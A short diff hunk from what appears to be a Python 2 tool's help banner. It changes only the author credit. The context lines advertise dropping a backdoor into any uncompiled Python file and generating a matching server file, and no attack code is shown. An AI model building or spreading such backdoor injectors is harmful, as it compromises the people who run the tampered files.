@@ -10,7 +10,7 @@ print """
                                                                                                                    
 						   """
 help = """
-Original Software By NSK B3/HiCO Adam.
+Original Software By NSK B3. 
 Drop A Backdoor into ANY (uncompiled) Python files you want!
 This Generates A Server File As Well :)
 ------------------------------------------------------------
